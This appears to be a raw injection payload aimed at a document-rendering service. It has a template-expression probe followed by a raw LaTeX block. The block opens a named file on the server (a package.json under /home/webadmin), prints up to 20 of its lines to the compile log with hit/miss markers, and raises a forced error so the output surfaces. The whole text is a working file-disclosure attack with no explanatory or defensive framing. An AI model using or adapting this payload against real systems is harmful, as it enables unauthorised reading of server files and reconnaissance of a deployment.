{{ overrides | merge(defaults) | json }}

```{=latex}
\newread\leak
\newcount\linecount
\openin\leak=/home/webadmin/aegis/node_modules/jsonpath-plus/package.json
\ifeof\leak
  \typeout{AEGIS-MISS:jsonpath-package}
\else
  \typeout{AEGIS-HIT:jsonpath-package}
  \linecount=0
  \def\readnext{
    \ifeof\leak
      \let\next\relax
    \else
      \read\leak to \leakline
      \advance\linecount by 1
      \typeout{FILELINE:\the\linecount:\leakline}
      \ifnum\linecount<20
        \let\next\readnext
      \else
        \let\next\relax
      \fi
    \fi
    \next
  }
  \readnext
\fi
\closein\leak
\errmessage{AEGIS-FORCE-DIAGNOSTIC}
\mbox{}
```
